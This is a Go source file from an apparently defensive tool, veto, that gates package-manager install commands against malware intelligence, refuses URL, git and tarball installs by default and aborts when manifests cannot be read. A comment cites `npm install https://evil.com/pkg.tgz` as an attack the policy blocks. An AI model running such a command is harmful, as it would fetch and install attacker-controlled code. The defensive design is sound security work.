// Package gate makes the final allow/refuse decision for a parsed install
// command. It consults the intel.Store for each Install and aggregates the
// verdicts; policy choices about local paths, implicit installs, and on-disk
// manifest expansion live here so the package-manager parsers stay stateless.
package gate

import (
	"github.com/rs/zerolog"

	"github.com/brynbellomy/veto/internal/intel"
	"github.com/brynbellomy/veto/internal/packagemanager"
)

// Outcome is the gate's verdict for a complete install command.
type Outcome string

const (
	// OutcomeAllow: no Install matched a malware report. Pass through to the
	// real package manager.
	OutcomeAllow Outcome = "allow"

	// OutcomeRefuse: at least one Install matched malware intel. The veto
	// must NOT exec the real package manager.
	OutcomeRefuse Outcome = "refuse"

	// OutcomePassThrough: the command did not describe an install (parser
	// returned nil). The veto execs the real binary unchanged.
	OutcomePassThrough Outcome = "passthrough"

	// OutcomeAbort: an internal failure prevented the gate from making a
	// confident decision — typically a manifest file the gate was supposed to
	// read raised an I/O error. The veto must NOT exec the real package
	// manager; the agent sees a distinct error from malware-driven refusals
	// so the failure isn't mistaken for a normal block.
	OutcomeAbort Outcome = "abort"
)

// Decision is the full result of an evaluation, including per-install
// verdicts so callers can render useful diagnostics.
type Decision struct {
	Outcome  Outcome
	Verdicts []intel.Verdict

	// Errors carries internal failures that pushed Outcome to OutcomeAbort.
	// Always nil for OutcomeAllow / OutcomeRefuse / OutcomePassThrough.
	Errors []error
}

// Flagged returns the verdicts that produced refusals, in order. Empty when
// Outcome != OutcomeRefuse.
func (d Decision) Flagged() []intel.Verdict {
	out := make([]intel.Verdict, 0, len(d.Verdicts))
	for _, v := range d.Verdicts {
		if v.Flagged() {
			out = append(out, v)
		}
	}
	return out
}

// ManifestExpander turns a parser-extracted manifest reference (e.g. pip's
// `-r requirements.txt`) into the Install records the gate should look up.
// Implementations perform the actual file I/O so the package-manager parsers
// remain pure.
//
// Implementations must be safe for concurrent use. Expand returns wrapped
// errors with the offending path attached as a field when I/O fails; malformed
// lines inside a manifest are skipped silently (over-include is safer than
// crashing the gate mid-install).
type ManifestExpander interface {
	Expand(ref packagemanager.ManifestRef) ([]packagemanager.Install, error)
}

// NopExpander is the zero-cost default ManifestExpander: it returns no
// installs and no error for every ref. Wire it in when manifest expansion is
// not desired, so the gate's call sites stay unconditional.
type NopExpander struct{}

var _ ManifestExpander = NopExpander{}

// Expand implements ManifestExpander. Returns nil, nil.
func (NopExpander) Expand(_ packagemanager.ManifestRef) ([]packagemanager.Install, error) {
	return nil, nil
}

// Policy configures gate behavior.
type Policy struct {
	// AllowLocalPath: when true, Installs marked LocalPath (filesystem
	// paths like `./pkg` or `/abs/pkg`) pass through without an intel
	// lookup — there is nothing to look up by name. When false, the gate
	// refuses local filesystem installs as well. Default true.
	AllowLocalPath bool

	// AllowOpaqueRemote: when true, Installs marked OpaqueRemote (URL,
	// git, tarball, or `user/repo` GitHub shorthand) pass through. When
	// false (the default), they are refused — because upstream malware
	// feeds CAN flag these by URL or commit hash, and silently passing
	// them through would be a fail-OPEN. The CLI surfaces this as
	// VETO_ALLOW_OPAQUE=1 for opt-in.
	//
	// Refusal is reported through a synthetic intel.Verdict with
	// SourceID="veto-policy" so the existing refusal-printing code
	// renders it the same as a malware-driven refusal.
	AllowOpaqueRemote bool

	// ManifestExpander turns ManifestRefs (e.g. `-r requirements.txt`) into
	// additional Install records before lookup. Defaults to NopExpander so
	// callers that don't opt in keep the previous "argv-only" behavior.
	ManifestExpander ManifestExpander
}

// DefaultPolicy returns a Policy with the project's chosen defaults:
//   - LocalPath installs pass (no intel to look up; the user explicitly
//     pointed at a path they control)
//   - OpaqueRemote installs are REFUSED (URL/git/tarball/github-shorthand
//     bypass the registry and can carry payloads named in upstream
//     intel; refusing by default closes a fail-OPEN that previously let
//     `npm install https://evil.com/pkg.tgz` slip through)
//   - Manifest expansion is a no-op (callers wire in pyreq.Expander etc.
//     to enable requirements.txt gating).
func DefaultPolicy() Policy {
	return Policy{AllowLocalPath: true, AllowOpaqueRemote: false, ManifestExpander: NopExpander{}}
}

// Gate evaluates Installs against an intel store under a policy.
type Gate struct {
	store    intel.Store
	policy   Policy
	expander ManifestExpander
	logger   zerolog.Logger
}

// New builds a Gate. A nil-valued Policy.ManifestExpander is replaced with
// NopExpander so call sites stay nil-free.
func New(store intel.Store, policy Policy) *Gate {
	if policy.ManifestExpander == nil {
		policy.ManifestExpander = NopExpander{}
	}
	return &Gate{
		store:    store,
		policy:   policy,
		expander: policy.ManifestExpander,
		logger:   zerolog.Nop(),
	}
}

// WithLogger returns a copy of g configured with the given logger. The logger
// is used to surface manifest-expansion failures, which are non-fatal —
// missing or unreadable requirements files don't refuse the install on their
// own.
func (g *Gate) WithLogger(logger zerolog.Logger) *Gate {
	copy := *g
	copy.logger = logger
	return &copy
}

// Evaluate returns the decision for the given installs. A nil installs
// argument (parser returned no installs) yields OutcomePassThrough.
// An empty (non-nil) installs argument paired with empty manifestRefs
// yields OutcomeAllow — the parser saw an install verb but had nothing
// to gate, AND the project has no on-disk manifest/lockfile contributing
// anything either. (For the common "`npm install` resolving from
// package.json" case the parser DOES emit package.json + every lockfile
// ManifestRef — see jsspec.PackageJSONManifestRefs — so the gate's
// expander gates the transitive tree.)
//
// manifestRefs, when non-empty, are passed through Policy.ManifestExpander
// to discover transitive Installs (pip's `-r requirements.txt`, npm's
// `package.json`, poetry's `pyproject.toml`). Any installs the expander
// produces are gated alongside the argv-named ones.
//
// Fail-closed semantics: if a ManifestExpander returns an error (typically
// because a referenced manifest file can't be parsed or doesn't exist when
// it should), Evaluate returns OutcomeAbort. The agent's command never
// reaches the real package manager; the caller sees a clearly-distinct
// error from malware-driven refusals.
func (g *Gate) Evaluate(installs []packagemanager.Install, manifestRefs ...packagemanager.ManifestRef) Decision {
	if installs == nil && len(manifestRefs) == 0 {
		return Decision{Outcome: OutcomePassThrough}
	}

	// Expand manifest refs first so a refusal from inside a requirements.txt
	// flips the decision even when argv named no explicit specs.
	expanded := installs
	var expanderErrs []error
	for _, ref := range manifestRefs {
		extra, err := g.expander.Expand(ref)
		if err != nil {
			// Fail-closed: we cannot prove the manifest's contents are safe, so
			// the install must not proceed. The caller maps OutcomeAbort to an
			// internal-error exit code so the failure isn't mistaken for a
			// "package is malicious" block.
			g.logger.Error().
				Err(err).
				Str("path", ref.Path).
				Str("kind", string(ref.Kind)).
				Msg("manifest expansion failed; aborting install fail-closed")
			expanderErrs = append(expanderErrs, err)
			continue
		}
		expanded = append(expanded, extra...)
	}

	if len(expanderErrs) > 0 {
		return Decision{Outcome: OutcomeAbort, Errors: expanderErrs}
	}

	if expanded == nil {
		// Caller passed nil installs and refs that expanded to nothing.
		// Treat as passthrough — the command wasn't an install in any
		// meaningful sense.
		return Decision{Outcome: OutcomePassThrough}
	}

	decision := Decision{Outcome: OutcomeAllow}
	for _, ins := range expanded {
		// Opaque remote specs (URL / git / tarball / github-shorthand)
		// are refused by default. Synthesize a Verdict so the existing
		// printer renders the refusal alongside any malware findings.
		if ins.OpaqueRemote {
			if !g.policy.AllowOpaqueRemote {
				decision.Verdicts = append(decision.Verdicts, policyRefusalVerdict(ins,
					"opaque-spec install refused: URL/git/tarball specs bypass the package "+
						"registry and can carry payloads. Set VETO_ALLOW_OPAQUE=1 to override "+
						"after independently verifying the source."))
				decision.Outcome = OutcomeRefuse
				continue
			}
			// Allow-opaque: passthrough; no name to look up.
			continue
		}
		if ins.LocalPath {
			// Empty-name local lookups are meaningless against a name-keyed store.
			if g.policy.AllowLocalPath {
				continue
			}
			decision.Verdicts = append(decision.Verdicts, policyRefusalVerdict(ins,
				"local-path install refused: AllowLocalPath is disabled."))
			decision.Outcome = OutcomeRefuse
			continue
		}
		verdict := g.store.Lookup(ins.Ref)
		decision.Verdicts = append(decision.Verdicts, verdict)
		if verdict.Flagged() {
			decision.Outcome = OutcomeRefuse
		}
	}
	return decision
}

// policyRefusalVerdict synthesizes a Verdict that the gate's printer can
// render identically to a malware-flag refusal. SourceID "veto-policy"
// is the only non-upstream identifier the printer encounters; reserving
// the name here keeps it from colliding with a real intel source.
func policyRefusalVerdict(ins packagemanager.Install, reason string) intel.Verdict {
	return intel.Verdict{
		Ref: ins.Ref,
		Reports: []intel.MalwareReport{
			{
				PackageRef: ins.Ref,
				SourceID:   "veto-policy",
				Reason:     reason,
			},
		},
	}
}
